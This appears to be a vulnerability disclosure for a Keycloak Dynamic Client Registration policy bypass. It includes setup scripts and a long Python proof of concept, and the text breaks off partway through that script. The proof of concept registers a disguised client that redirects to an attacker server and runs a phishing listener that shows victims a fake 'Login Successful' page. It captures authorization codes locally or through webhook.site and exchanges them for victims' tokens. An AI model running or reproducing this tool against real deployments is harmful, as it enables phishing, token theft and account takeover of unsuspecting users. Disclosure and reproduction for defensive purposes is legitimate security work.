# DCR Trusted Hosts Bypass — Token Theft via Phishing

## Summary

- Dynamic Client Registration (DCR) policy "Trusted Hosts" only applies to anonymous registrations. A user with the `create-client` role (realm-management) can register an OIDC client with any `redirect_uris` (including to an attacker-controlled server) via authenticated DCR. This enables a live phishing attack: the attacker generates a phishing URL from the real Keycloak domain, runs a capture server, waits for the victim to login, then automatically steals the victim's token.

## Vulnerability Type

- Broken Access Control / Privilege Escalation via Client Registration Policy Bypass

## Affected Component(s)

- DCR Endpoint (`/realms/{realm}/clients-registrations/openid-connect`)
- Client Registration Policy Engine (subType `authenticated` missing Trusted Hosts policy)

## Affected Version(s)

- Keycloak 26.5.4 (latest stable, reproduction confirmed)

## Keycloak Configuration Context (If Applicable)

- Default DCR policy configuration. The `Trusted Hosts` policy exists in subType `anonymous` but is **absent** from subType `authenticated`. The `create-client` role (realm-management) is typically delegated to developers for self-service client registration.

---

## Detailed Description

### End-to-End Attack Flow

```
Attacker (has create-client role)
    │
    ├─ 1. Login, obtain Bearer token
    ├─ 2. Register malicious client via DCR (redirect_uri → attacker's server)
    ├─ 3. Generate phishing URL (real Keycloak domain)
    ├─ 4. Start HTTP server to capture auth codes
    ├─ 5. Send phishing URL to victim
    │
    │  ┌─ Victim clicks phishing URL
    │  ├─ Sees the REAL Keycloak login page (100% legitimate)
    │  ├─ Logs in with their credentials
    │  └─ Redirected to attacker's server (auth code sent)
    │
    ├─ 6. Attacker's server captures auth code
    ├─ 7. Exchange auth code → access token + refresh token of victim
    └─ 8. Full access to victim's account
```

### Architecture

This PoC is designed as a **two-machine attack**:

| Machine | Role | Description |
|---|---|---|
| **Machine A** (KC Server) | Keycloak host + one-time admin setup | Runs the admin setup script to create users and assign roles |
| **Machine B** (Attacker) | Runs the attack, captures victim tokens | Runs the attack script from any remote machine — no admin access needed |

If you only have one machine, you can run both scripts on it — just use the public IP for `--host` and `--attacker-host`.

### Policy Analysis

Keycloak's DCR endpoint has two modes of operation:

- **`anonymous`** — No authentication; protected by the "Trusted Hosts" policy which validates redirect URIs.
- **`authenticated`** — Requires Bearer token; has a separate policy set.

The `Trusted Hosts` policy (which validates `redirect_uris`) **only exists in subType `anonymous`**. SubType `authenticated` has no URI validation whatsoever.

| Policy | subType `anonymous` | subType `authenticated` |
|---|---|---|
| Trusted Hosts (`client-uris-must-match`) | Enforced | **ABSENT** |
| Allowed Protocol Mapper Types | Enforced | Enforced |
| Allowed Client Scopes | Enforced | Enforced |
| Max Clients Limit | Enforced | Absent |
| Consent Required | Enforced | Absent |

### Privilege Boundary Verification

| Action | Endpoint | Result |
|---|---|---|
| `create-client` role → DCR with any redirect | `/realms/{realm}/clients-registrations/openid-connect` | **201 Created (SUCCESS)** |
| `create-client` role → Admin REST API | `/admin/realms/{realm}/clients` | **403 Forbidden (BLOCKED)** |
| Anonymous DCR with redirect to attacker | `/realms/{realm}/clients-registrations/openid-connect` | **403 "Trusted Hosts" rejected** |

The registered malicious client:
- **Immediately active** — no admin approval needed
- **Fully functional** — can initiate authorization code flow
- **Has a client secret** — attacker can exchange auth code for tokens

---

## Steps to Reproduce (Proof of Concept - PoC)

**Prerequisites:**
- Keycloak 26.5.4 instance with a realm (e.g., `test`)
- A public OIDC client in the realm (e.g., `webapp`) with Direct Access Grants enabled
- Python 3.8+ (standard library only — no pip install needed)
- Attacker: `testuser / Password123` with `create-client` role (assigned via admin setup)
- Victim: `victim / Password123`
- **Two machines:** Machine A (KC server, admin access) and Machine B (attacker, no admin)

### Step 1 — Admin Setup (Machine A — One-Time)

This prepares the environment: creates users and assigns the `create-client` role. This is NOT part of the attack — it simulates the real-world prerequisite that a user has the `create-client` role.

Save the following as `setup_dcr_admin.py` and run it on the KC server (or any machine with admin access):

```bash
python3 setup_dcr_admin.py --host http://localhost:8080 --realm test
```

**setup_dcr_admin.py — Full Source Code:**

```python
#!/usr/bin/env python3
"""
DCR Trusted Hosts Bypass — Admin Setup Script
One-time environment preparation (NOT part of the attack).

Creates testuser + victim users and assigns create-client role to testuser.
Run this on the Keycloak server or any machine with admin access.

Usage:
  python3 setup_dcr_admin.py --host http://localhost:8080
  python3 setup_dcr_admin.py --host http://46.101.162.187:8080
"""

import http.client
import json
import argparse
import sys
import urllib.parse

# ═══ ANSI Colors ═══
RED = "\033[91m"
GREEN = "\033[92m"
YELLOW = "\033[93m"
BLUE = "\033[94m"
CYAN = "\033[96m"
BOLD = "\033[1m"
RESET = "\033[0m"


def success(msg):
    print(f"  {GREEN}[+]{RESET} {msg}")


def fail(msg):
    print(f"  {RED}[-]{RESET} {msg}")


def info(msg):
    print(f"  {BLUE}[*]{RESET} {msg}")


def warn(msg):
    print(f"  {YELLOW}[!]{RESET} {msg}")


# ═══ HTTP Helpers ═══

def http_post_form(host, port, path, data, token=None):
    conn = http.client.HTTPConnection(host, port, timeout=15)
    headers = {"Content-Type": "application/x-www-form-urlencoded"}
    if token:
        headers["Authorization"] = f"Bearer {token}"
    body = urllib.parse.urlencode(data) if isinstance(data, dict) else data
    conn.request("POST", path, body, headers)
    resp = conn.getresponse()
    raw = resp.read().decode()
    status = resp.status
    conn.close()
    try:
        return status, json.loads(raw)
    except json.JSONDecodeError:
        return status, {"_raw": raw}


def http_post_json(host, port, path, data, token=None):
    conn = http.client.HTTPConnection(host, port, timeout=15)
    headers = {"Content-Type": "application/json"}
    if token:
        headers["Authorization"] = f"Bearer {token}"
    conn.request("POST", path, json.dumps(data), headers)
    resp = conn.getresponse()
    raw = resp.read().decode()
    status = resp.status
    conn.close()
    try:
        return status, json.loads(raw)
    except json.JSONDecodeError:
        return status, {"_raw": raw}


def http_get_json(host, port, path, token=None):
    conn = http.client.HTTPConnection(host, port, timeout=15)
    headers = {}
    if token:
        headers["Authorization"] = f"Bearer {token}"
    conn.request("GET", path, headers=headers)
    resp = conn.getresponse()
    raw = resp.read().decode()
    status = resp.status
    conn.close()
    try:
        return status, json.loads(raw)
    except json.JSONDecodeError:
        return status, {"_raw": raw}


def http_put_json(host, port, path, data, token=None):
    conn = http.client.HTTPConnection(host, port, timeout=15)
    headers = {"Content-Type": "application/json"}
    if token:
        headers["Authorization"] = f"Bearer {token}"
    conn.request("PUT", path, json.dumps(data), headers)
    resp = conn.getresponse()
    raw = resp.read().decode()
    status = resp.status
    conn.close()
    try:
        return status, json.loads(raw)
    except json.JSONDecodeError:
        return status, {"_raw": raw}


def create_user_if_missing(host, port, realm, token, username, password, email, first, last):
    """Create a user if they don't already exist. Returns user ID."""
    _, users = http_get_json(host, port,
        f"/admin/realms/{realm}/users?username={username}&exact=true", token)

    if isinstance(users, list) and len(users) > 0:
        uid = users[0]["id"]
        info(f"User '{username}' already exists (ID: {uid})")
        return uid

    user_data = {
        "username": username,
        "email": email,
        "firstName": first,
        "lastName": last,
        "enabled": True,
        "emailVerified": True,
        "credentials": [{"type": "password", "value": password, "temporary": False}]
    }
    status, resp = http_post_json(host, port, f"/admin/realms/{realm}/users", user_data, token)

    if status == 201 or status == 409:
        # 201 = created, 409 = already exists (race condition)
        _, users = http_get_json(host, port,
            f"/admin/realms/{realm}/users?username={username}&exact=true", token)
        if isinstance(users, list) and len(users) > 0:
            uid = users[0]["id"]
            success(f"User '{username}' created (ID: {uid})")
            return uid

    fail(f"Failed to create user '{username}' (HTTP {status}): {resp}")
    return None


def main():
    parser = argparse.ArgumentParser(
        description="DCR Trusted Hosts Bypass — Admin Setup (create users and assign create-client role)")
    parser.add_argument("--host", default="http://localhost:8080",
                        help="Keycloak admin URL (default: http://localhost:8080)")
    parser.add_argument("--realm", default="test",
                        help="Target realm (default: test)")
    parser.add_argument("--admin-user", default="admin",
                        help="Admin username (default: admin)")
    parser.add_argument("--admin-pass", default="Admin1234",
                        help="Admin password (default: Admin1234)")
    args = parser.parse_args()

    parsed = urllib.parse.urlparse(args.host)
    host = parsed.hostname
    port = parsed.port or 8080
    realm = args.realm

    print(f"\n{BOLD}{CYAN}[Setup] DCR Trusted Hosts Bypass — Admin Environment Preparation{RESET}")
    info(f"Keycloak: {host}:{port}")
    info(f"Realm: {realm}")

    # Step 1: Get admin token
    info("Getting admin token...")
    status, data = http_post_form(host, port,
        "/realms/master/protocol/openid-connect/token",
        {"client_id": "admin-cli", "grant_type": "password",
         "username": args.admin_user, "password": args.admin_pass})

    admin_token = data.get("access_token", "")
    if not admin_token:
        fail(f"Failed to get admin token: {data}")
        return 1
    success("Admin token OK")

    # Step 2: Create testuser (attacker)
    info("Ensuring testuser exists...")
    testuser_id = create_user_if_missing(
        host, port, realm, admin_token,
        "testuser", "Password123", "testuser@test.com", "Test", "User")
    if not testuser_id:
        return 1

    # Step 3: Create victim user
    info("Ensuring victim user exists...")
    victim_id = create_user_if_missing(
        host, port, realm, admin_token,
        "victim", "Password123", "victim@test.com", "Victim", "User")
    if not victim_id:
        return 1

    # Step 4: Assign create-client role to testuser
    info("Assigning create-client role to testuser...")

    _, rm_clients = http_get_json(host, port,
        f"/admin/realms/{realm}/clients?clientId=realm-management", admin_token)
    if not isinstance(rm_clients, list) or len(rm_clients) == 0:
        fail("realm-management client not found!")
        return 1
    rm_client_id = rm_clients[0]["id"]

    _, create_role = http_get_json(host, port,
        f"/admin/realms/{realm}/clients/{rm_client_id}/roles/create-client", admin_token)
    if not isinstance(create_role, dict) or "id" not in create_role:
        fail(f"create-client role not found: {create_role}")
        return 1

    status, _ = http_post_json(host, port,
        f"/admin/realms/{realm}/users/{testuser_id}/role-mappings/clients/{rm_client_id}",
        [create_role], admin_token)
    # 204 = success, 409 = already assigned
    if status in (204, 409):
        success("create-client role assigned to testuser")
    else:
        # Check if already assigned by listing current mappings
        _, current = http_get_json(host, port,
            f"/admin/realms/{realm}/users/{testuser_id}/role-mappings/clients/{rm_client_id}",
            admin_token)
        if isinstance(current, list) and any(r.get("name") == "create-client" for r in current):
            success("create-client role already assigned to testuser")
        else:
            warn(f"Role assignment returned HTTP {status} (may already be assigned)")

    # Step 5: Ensure webapp client exists (public client for attacker login)
    info("Checking webapp client...")
    _, webapp_clients = http_get_json(host, port,
        f"/admin/realms/{realm}/clients?clientId=webapp", admin_token)
    if isinstance(webapp_clients, list) and len(webapp_clients) > 0:
        success("webapp client exists")
    else:
        warn("webapp client not found — attacker login may fail. Create it in Admin Console.")

    print(f"\n{GREEN}{BOLD}[+] Setup complete!{RESET}")
    print(f"    Attacker user : testuser / Password123 (has create-client role)")
    print(f"    Victim user   : victim / Password123")
    print(f"    Realm         : {realm}")
    print(f"\n    Now run the attack from any machine:")
    print(f"    python3 poc_dcr_hijack.py --host {args.host} --attacker-host <YOUR_IP>")
    print()
    return 0


if __name__ == "__main__":
    sys.exit(main())
```

**Expected output:**
```
[Setup] DCR Trusted Hosts Bypass — Admin Environment Preparation
  [*] Keycloak: localhost:8080
  [*] Realm: test
  [*] Getting admin token...
  [+] Admin token OK
  [*] Ensuring testuser exists...
  [+] User 'testuser' created (ID: ...)
  [*] Ensuring victim user exists...
  [+] User 'victim' created (ID: ...)
  [*] Assigning create-client role to testuser...
  [+] create-client role assigned to testuser
  [*] Checking webapp client...
  [+] webapp client exists

[+] Setup complete!
    Attacker user : testuser / Password123 (has create-client role)
    Victim user   : victim / Password123
    Realm         : test
```

Or manually via CLI:

```bash
ADMIN_TOKEN=$(curl -s -X POST http://localhost:8080/realms/master/protocol/openid-connect/token \
  -d "client_id=admin-cli&grant_type=password&username=admin&password=Admin1234" \
  | python3 -c "import sys,json; print(json.load(sys.stdin)['access_token'])")

USER_ID=$(curl -s -H "Authorization: Bearer $ADMIN_TOKEN" \
  "http://localhost:8080/admin/realms/test/users?username=testuser" \
  | python3 -c "import sys,json; print(json.load(sys.stdin)[0]['id'])")

RM_CLIENT=$(curl -s -H "Authorization: Bearer $ADMIN_TOKEN" \
  "http://localhost:8080/admin/realms/test/clients?clientId=realm-management" \
  | python3 -c "import sys,json; print(json.load(sys.stdin)[0]['id'])")

CREATE_ROLE=$(curl -s -H "Authorization: Bearer $ADMIN_TOKEN" \
  "http://localhost:8080/admin/realms/test/clients/$RM_CLIENT/roles/create-client")

curl -s -X POST -H "Authorization: Bearer $ADMIN_TOKEN" \
  -H "Content-Type: application/json" \
  -d "[$CREATE_ROLE]" \
  "http://localhost:8080/admin/realms/test/users/$USER_ID/role-mappings/clients/$RM_CLIENT"
```

---

### Step 2 — Run the Attack (Machine B — Attacker)

Save the following as `poc_dcr_hijack.py` and run from the attacker's machine. **No admin access or localhost connection is needed** — the script operates entirely through public Keycloak endpoints.

**Method A — With local listener (attacker has a public IP):**

```bash
python3 poc_dcr_hijack.py \
  --host http://<KEYCLOAK_IP>:8080 \
  --attacker-host <ATTACKER_PUBLIC_IP> \
  --listen-port 48888
```

**Method B — With webhook.site (attacker has no public IP):**

```bash
python3 poc_dcr_hijack.py \
  --host http://<KEYCLOAK_IP>:8080 \
  --use-webhook
```

**Automated testing mode (simulates victim login):**

```bash
python3 poc_dcr_hijack.py \
  --host http://<KEYCLOAK_IP>:8080 \
  --attacker-host <KEYCLOAK_IP> \
  --auto-victim --timeout 30
```

**Parameters:**
- `--host` — Keycloak public URL (required)
- `--attacker-host` — Attacker's public IP/hostname for callback listener
- `--use-webhook` — Use webhook.site as callback (no public IP needed)
- `--listen-port` — Attacker's phishing server port (default: 48888)
- `--realm` — Target realm (default: test)
- `--timeout` — Timeout waiting for victim in seconds (default: 300)
- `--auto-victim` — Automatically simulate victim login (for testing/CI)

**poc_dcr_hijack.py — Full Source Code:**

```python
#!/usr/bin/env python3
"""
DCR Trusted Hosts Bypass — Live Phishing Attack + Token Theft
Severity: HIGH (CVSS 8.0)
Target: Keycloak 26.5.4

Realistic remote attacker PoC — runs from ANY machine, no admin access needed.
Prerequisites: run setup_dcr_admin.py once on the KC server to prepare users/roles.

Attack flow:
1. Login as testuser (public endpoint — no admin needed)
2. Register malicious client via authenticated DCR (redirect → attacker's server)
3. Control check — anonymous DCR should be blocked
4. Start phishing server on attacker machine (or use webhook.site)
5. Generate phishing URL (real Keycloak domain)
6. Wait for victim to click & login
7. Exchange captured auth code for victim's tokens
8. Verify access to victim data

Usage:
  # With local listener (attacker has public IP):
  python3 poc_dcr_hijack.py --host http://TARGET:8080 --attacker-host ATTACKER_IP

  # With webhook.site (attacker has no public IP):
  python3 poc_dcr_hijack.py --host http://TARGET:8080 --use-webhook

  # Automated testing (simulate victim login):
  python3 poc_dcr_hijack.py --host http://TARGET:8080 --attacker-host TARGET_IP --auto-victim
"""

import http.client
import http.server
import json
import base64
import argparse
import sys
import re
import socket
import ssl
import time
import threading
import urllib.parse

# ═══ ANSI Colors ═══
RED = "\033[91m"
GREEN = "\033[92m"
YELLOW = "\033[93m"
BLUE = "\033[94m"
MAGENTA = "\033[95m"
CYAN = "\033[96m"
WHITE = "\033[97m"
BOLD = "\033[1m"
DIM = "\033[2m"
RESET = "\033[0m"

# ═══ Global: store captured auth code ═══
captured_code = None
captured_event = threading.Event()


def banner():
    print(f"""
{RED}{BOLD}╔══════════════════════════════════════════════════════════════╗
║  DCR Trusted Hosts Bypass                                    ║
║  Live Phishing Attack — Automated Token Theft                ║
║  Keycloak 26.5.4 — CVSS 8.0 (HIGH)                         ║
╚══════════════════════════════════════════════════════════════╝{RESET}
""")


def step(n, msg):
    print(f"\n{BOLD}{CYAN}[Step {n}]{RESET} {BOLD}{msg}{RESET}")


def success(msg):
    print(f"  {GREEN}[+]{RESET} {msg}")


def fail(msg):
    print(f"  {RED}[-]{RESET} {msg}")


def info(msg):
    print(f"  {BLUE}[*]{RESET} {msg}")


def warn(msg):
    print(f"  {YELLOW}[!]{RESET} {msg}")


# ═══ HTTP Helpers ═══

def http_post_form(host, port, path, data, token=None):
    """POST form-urlencoded, return (status, dict)"""
    conn = http.client.HTTPConnection(host, port, timeout=15)
    headers = {"Content-Type": "application/x-www-form-urlencoded"}
    if token:
        headers["Authorization"] = f"Bearer {token}"
    body = urllib.parse.urlencode(data) if isinstance(data, dict) else data
    conn.request("POST", path, body, headers)
    resp = conn.getresponse()
    raw = resp.read().decode()
    status = resp.status
    conn.close()
    try:
        return status, json.loads(raw)
    except json.JSONDecodeError:
        return status, {"_raw": raw}


def http_post_json(host, port, path, data, token=None):
    """POST JSON, return (status, dict)"""
    conn = http.client.HTTPConnection(host, port, timeout=15)
    headers = {"Content-Type": "application/json"}
    if token:
        headers["Authorization"] = f"Bearer {token}"
    conn.request("POST", path, json.dumps(data), headers)
    resp = conn.getresponse()
    raw = resp.read().decode()
    status = resp.status
    conn.close()
    try:
        return status, json.loads(raw)
    except json.JSONDecodeError:
        return status, {"_raw": raw}


def http_get_json(host, port, path, token=None):
    """GET JSON, return (status, dict/list)"""
    conn = http.client.HTTPConnection(host, port, timeout=15)
    headers = {}
    if token:
        headers["Authorization"] = f"Bearer {token}"
    conn.request("GET", path, headers=headers)
    resp = conn.getresponse()
    raw = resp.read().decode()
    status = resp.status
    conn.close()
    try:
        return status, json.loads(raw)
    except json.JSONDecodeError:
        return status, {"_raw": raw}


def decode_jwt(token):
    """Decode JWT payload without verification"""
    payload = token.split(".")[1]
    payload += "=" * (4 - len(payload) % 4)
    return json.loads(base64.b64decode(payload))


# ═══ Webhook.site Helpers ═══

def https_request(method, host, path, body=None, headers=None, timeout=15):
    """Make HTTPS request, return (status, response_body_str)."""
    try:
        ctx = ssl.create_default_context()
        conn = http.client.HTTPSConnection(host, timeout=timeout, context=ctx)
        conn.request(method, path, body=body, headers=headers or {})
        resp = conn.getresponse()
        raw = resp.read().decode()
        status = resp.status
        conn.close()
        return status, raw
    except ssl.SSLCertVerificationError:
        # Fallback: macOS Python often lacks system CA certs
        ctx = ssl._create_unverified_context()
        conn = http.client.HTTPSConnection(host, timeout=timeout, context=ctx)
    conn.request(method, path, body=body, headers=headers or {})
    resp = conn.getresponse()
    raw = resp.read().decode()
    status = resp.status
    conn.close()
    return status, raw


def webhook_create_token():
    """Create a new webhook.site token. Returns (uuid, full_url) or (None, None)."""
    status, raw = https_request("POST", "webhook.site", "/token",
        body="", headers={"Content-Type": "application/json"})
    if status == 201 or status == 200:
        try:
            data = json.loads(raw)
            uuid = data.get("uuid", "")
            if uuid:
                return uuid, f"https://webhook.site/{uuid}"
        except json.JSONDecodeError:
            pass
    return None, None


def webhook_poll_for_code(uuid, timeout=300):
    """Poll webhook.site for a request containing an auth code. Returns code or None."""
    start = time.time()
    spinner = ["⠋", "⠙", "⠹", "⠸", "⠼", "⠴", "⠦", "⠧", "⠇", "⠏"]
    idx = 0
    while time.time() - start < timeout:
        elapsed = int(time.time() - start)
        print(f"\r  {YELLOW}{spinner[idx % len(spinner)]}{RESET} "
              f"Polling webhook.site for victim callback... ({elapsed}s / {timeout}s)",
              end="", flush=True)
        idx += 1

        try:
            status, raw = https_request("GET", "webhook.site",
                f"/token/{uuid}/requests?sorting=newest&per_page=5")
            if status == 200:
                data = json.loads(raw)
                requests_list = data.get("data", [])
                for req in requests_list:
                    query = req.get("query", {})
                    if "code" in query:
                        code = query["code"]
                        if isinstance(code, list):
                            code = code[0]
                        print("\r" + " " * 80 + "\r", end="")
                        return code
                    # Also check the URL string
                    url = req.get("url", "")
                    if "code=" in url:
                        parsed = urllib.parse.parse_qs(urllib.parse.urlparse(url).query)
                        if "code" in parsed:
                            print("\r" + " " * 80 + "\r", end="")
                            return parsed["code"][0]
        except Exception:
            pass

        time.sleep(3)

    print("\r" + " " * 80 + "\r", end="")
    return None


# ═══ Phishing Server (Captures Auth Code from Victim) ═══

class PhishingHandler(http.server.BaseHTTPRequestHandler):
    """HTTP handler that captures auth code from Keycloak redirect."""

    def do_GET(self):
        global captured_code
        params = urllib.parse.parse_qs(urllib.parse.urlparse(self.path).query)

        if "code" in params:
            captured_code = params["code"][0]

            # Show fake "success" page to victim
            self.send_response(200)
            self.send_header("Content-Type", "text/html; charset=utf-8")
            self.end_headers()
            html = """<!DOCTYPE html>
<html><head><meta charset="utf-8"><title>Login Successful</title>
<style>
  body { font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
         text-align: center; padding: 60px 20px; background: #f0f2f5; color: #333; }
  .card { background: #fff; padding: 48px; border-radius: 12px; max-width: 420px;
          margin: 0 auto; box-shadow: 0 2px 12px rgba(0,0,0,0.08); }
  .icon { font-size: 72px; color: #4CAF50; margin-bottom: 16px; }
  h2 { margin: 0 0 8px; font-size: 24px; }
  p { color: #666; margin: 4px 0; font-size: 15px; }
  .small { color: #aaa; font-size: 12px; margin-top: 24px; }
</style></head><body>
<div class="card">
  <div class="icon">&#10004;</div>
  <h2>Login Successful!</h2>
  <p>You have been successfully signed in.</p>
  <p class="small">You may close this page.</p>
</div></body></html>"""
            self.wfile.write(html.encode())

            # Notify attacker terminal
            print(f"\n  {RED}{BOLD}{'=' * 55}{RESET}")
            print(f"  {RED}{BOLD}  *** VICTIM AUTH CODE CAPTURED! ***{RESET}")
            print(f"  {RED}{BOLD}{'=' * 55}{RESET}")
            print(f"  {RED}  Code: {captured_code}{RESET}")
            print(f"  {RED}{BOLD}{'=' * 55}{RESET}")

            captured_event.set()
        else:
            # Other requests (favicon, etc.)
            self.send_response(200)
            self.send_header("Content-Type", "text/html")
            self.end_headers()
            self.wfile.write(b"<html><body>Loading...</body></html>")

    def log_message(self, format, *args):
        pass  # Suppress default logging


def start_phishing_server(port):
    """Start HTTP server on background thread."""
    class ReusableServer(http.server.HTTPServer):
        allow_reuse_address = True
        def server_bind(self):
            self.socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            super().server_bind()

    server = ReusableServer(("0.0.0.0", port), PhishingHandler)
    thread = threading.Thread(target=server.serve_forever, daemon=True)
    thread.start()
    return server


# ═══ Auto-Victim Simulation ═══

def simulate_victim_login(kc_host, kc_port, realm, client_id, redirect_uri, listen_port):
    """Automatically simulate victim login (for --auto-victim mode)."""
    time.sleep(2)

    try:
        auth_path = (
            f"/realms/{realm}/protocol/openid-connect/auth"
            f"?client_id={client_id}&response_type=code"
            f"&redirect_uri={urllib.parse.quote(redirect_uri, safe='')}"
            f"&scope=openid+profile+email"
        )

        conn = http.client.HTTPConnection(kc_host, kc_port, timeout=15)
        conn.request("GET", auth_path)
        resp = conn.getresponse()
        body = resp.read().decode()
        cookies_raw = [v for k, v in resp.getheaders() if k.lower() == "set-cookie"]
        location = resp.getheader("Location", "")
        status = resp.status
        conn.close()

        cookies = {}
        for c in cookies_raw:
            part = c.split(";")[0]
            if "=" in part:
                k, v = part.split("=", 1)
                cookies[k] = v

        while status in (302, 303) and location:
            if location.startswith("http"):
                loc_parsed = urllib.parse.urlparse(location)
                loc_path = loc_parsed.path + ("?" + loc_parsed.query if loc_parsed.query else "")
            else:
                loc_path = location

            conn = http.client.HTTPConnection(kc_host, kc_port, timeout=15)
            cookie_str = "; ".join(f"{k}={v}" for k, v in cookies.items())
            conn.request("GET", loc_path, headers={"Cookie": cookie_str} if cookie_str else {})
            resp = conn.getresponse()
            body = resp.read().decode()
            for c in [v for k, v in resp.getheaders() if k.lower() == "set-cookie"]:
                part = c.split(";")[0]
                if "=" in part:
                    k, v = part.split("=", 1)
                    cookies[k] = v
            location = resp.getheader("Location", "")
            status = resp.status
            conn.close()

        action_match = re.search(r'action="([^"]+)"', body)
        if not action_match:
            return

        action_url = action_match.group(1).replace("&amp;", "&")
        if action_url.startswith("http"):
            action_parsed = urllib.parse.urlparse(action_url)
            action_path = action_parsed.path + ("?" + action_parsed.query if action_parsed.query else "")
        else:
            action_path = action_url

        login_body = "username=victim&password=Password123&credentialId="
        cookie_str = "; ".join(f"{k}={v}" for k, v in cookies.items())

        conn = http.client.HTTPConnection(kc_host, kc_port, timeout=15)
        conn.request("POST", action_path, login_body, {
            "Content-Type": "application/x-www-form-urlencoded",
            "Cookie": cookie_str
        })
        resp = conn.getresponse()
        resp.read()
        redirect_location = resp.getheader("Location", "")
        conn.close()

        if redirect_location and str(listen_port) in redirect_location:
            redir_parsed = urllib.parse.urlparse(redirect_location)
            redir_host = redir_parsed.hostname
            redir_port = redir_parsed.port

            # For auto-victim, connect to localhost if the redirect points to
            # the same machine (common in automated testing)
            try:
                conn = http.client.HTTPConnection(redir_host, redir_port, timeout=10)
                conn.request("GET", redir_parsed.path + "?" + redir_parsed.query)
                conn.getresponse().read()
                conn.close()
            except Exception:
                # If the attacker-host IP isn't reachable, try localhost
                try:
                    conn = http.client.HTTPConnection("127.0.0.1", redir_port, timeout=10)
                    conn.request("GET", redir_parsed.path + "?" + redir_parsed.query)
                    conn.getresponse().read()
                    conn.close()
                except Exception:
                    pass

    except Exception:
        pass


# ═══ Main ═══

def main():
    parser = argparse.ArgumentParser(
        description="PoC: DCR Trusted Hosts Bypass — Live Phishing Attack (Remote Attacker)")
    parser.add_argument("--host", required=True,
                        help="Keycloak public URL (e.g. http://46.101.162.187:8080)")
    parser.add_argument("--attacker-host", default=None,
                        help="Attacker's public IP/hostname for callback listener")
    parser.add_argument("--listen-port", type=int, default=48888,
                        help="Port for attacker phishing server (default: 48888)")
    parser.add_argument("--realm", default="test",
                        help="Target realm (default: test)")
    parser.add_argument("--timeout", type=int, default=300,
                        help="Timeout waiting for victim in seconds (default: 300)")
    parser.add_argument("--auto-victim", action="store_true",
                        help="Automatically simulate victim login (for testing/CI)")
    parser.add_argument("--use-webhook", action="store_true",
                        help="Use webhook.site as callback (no public IP needed)")
    args = parser.parse_args()

    # Validate args
    if not args.attacker_host and not args.use_webhook:
        fail("Must specify either --attacker-host <IP> or --use-webhook")
        print(f"\n  {YELLOW}Examples:{RESET}")
        print(f"    python3 poc_dcr_hijack.py --host http://TARGET:8080 --attacker-host YOUR_IP")
        print(f"    python3 poc_dcr_hijack.py --host http://TARGET:8080 --use-webhook")
        return 1

    if args.attacker_host and args.use_webhook:
        warn("Both --attacker-host and --use-webhook specified; using webhook mode")
        args.attacker_host = None

    # Parse host
    parsed = urllib.parse.urlparse(args.host)
    kc_host = parsed.hostname
    kc_port = parsed.port or 8080
    listen_port = args.listen_port
    realm = args.realm
    use_webhook = args.use_webhook
    results = []

    # Determine callback URL
    webhook_uuid = None
    if use_webhook:
        callback_url = None  # Will be set after creating webhook token
    else:
        callback_url = f"http://{args.attacker_host}:{listen_port}/callback"

    banner()
    info(f"Target Keycloak  : {kc_host}:{kc_port}")
    if use_webhook:
        info(f"Callback mode    : webhook.site (no public IP needed)")
    else:
        info(f"Attacker server  : {args.attacker_host}:{listen_port}")
    info(f"Victim timeout   : {args.timeout}s")

    # ══════════════════════════════════════════════════════════════
    # STEP 1: Attacker login (public endpoint — no admin needed)
    # ══════════════════════════════════════════════════════════════
    step(1, "ATTACKER — Login as testuser (has create-client role)")

    status, data = http_post_form(kc_host, kc_port,
        f"/realms/{realm}/protocol/openid-connect/token",
        {"client_id": "webapp", "grant_type": "password",
         "username": "testuser", "password": "Password123", "scope": "openid"})

    attacker_token = data.get("access_token", "")
    if not attacker_token:
        fail(f"Login failed: {data}")
        fail("Ensure setup_dcr_admin.py has been run first!")
        return 1
    success(f"Login successful — token: {attacker_token}")

    # ══════════════════════════════════════════════════════════════
    # STEP 2: Set up callback endpoint
    # ══════════════════════════════════════════════════════════════
    if use_webhook:
        step(2, "ATTACKER — Create webhook.site callback endpoint")
        info("Creating webhook.site token...")
        webhook_uuid, callback_url = webhook_create_token()
        if not webhook_uuid:
            fail("Failed to create webhook.site token!")
            fail("webhook.site may be down or rate-limiting. Try --attacker-host instead.")
            return 1
        success(f"Webhook token: {webhook_uuid}")
        info(f"Callback URL: {callback_url}")
    else:
        step(2, "ATTACKER — Prepare callback endpoint")
        info(f"Callback URL: {callback_url}")

    # ══════════════════════════════════════════════════════════════
    # STEP 3: Register malicious client via authenticated DCR
    # ══════════════════════════════════════════════════════════════
    step(3, "ATTACKER — Register malicious client via Dynamic Client Registration")

    info(f"Redirect URI to attacker server: {callback_url}")

    dcr_data = {
        "client_name": "Official Company App",
        "redirect_uris": [callback_url],
        "grant_types": ["authorization_code", "refresh_token"],
        "response_types": ["code"],
        "token_endpoint_auth_method": "client_secret_basic"
    }

    status, reg_resp = http_post_json(kc_host, kc_port,
        f"/realms/{realm}/clients-registrations/openid-connect",
        dcr_data, attacker_token)

    if "client_id" not in reg_resp:
        fail(f"DCR failed (HTTP {status}): {reg_resp}")
        return 1

    mal_client_id = reg_resp["client_id"]
    mal_secret = reg_resp.get("client_secret", "")

    success("Malicious client REGISTERED successfully!")
    print(f"    {MAGENTA}Client ID     : {mal_client_id}{RESET}")
    print(f"    {MAGENTA}Client Secret : {mal_secret}{RESET}")
    print(f"    {MAGENTA}Redirect URI  : {callback_url}{RESET}")
    print(f"    {MAGENTA}Client Name   : Official Company App{RESET}")
    warn("Trusted Hosts policy NOT enforced for authenticated DCR!")
    results.append(("DCR bypass (malicious client registered)", True))

    # ══════════════════════════════════════════════════════════════
    # STEP 4: Control — Anonymous DCR should be blocked
    # ══════════════════════════════════════════════════════════════
    step(4, "CONTROL — Anonymous DCR (no authentication)")

    status, anon_resp = http_post_json(kc_host, kc_port,
        f"/realms/{realm}/clients-registrations/openid-connect",
        {"client_name": "anon-test", "redirect_uris": [callback_url]})

    anon_desc = anon_resp.get("error_description", anon_resp.get("error", str(anon_resp)))
    if status == 403 or "Trusted Hosts" in str(anon_resp):
        success(f"Anonymous DCR BLOCKED (correct): {anon_desc[:80]}")
        results.append(("Control: Anonymous DCR blocked", True))
    else:
        warn(f"Anonymous DCR not blocked (HTTP {status})")
        results.append(("Control: Anonymous DCR blocked", False))

    info("Policy gap confirmed: Anonymous=BLOCKED, Authenticated=ALLOWED")

    # ══════════════════════════════════════════════════════════════
    # STEP 5: Start phishing server / prepare webhook listener
    # ══════════════════════════════════════════════════════════════
    server = None
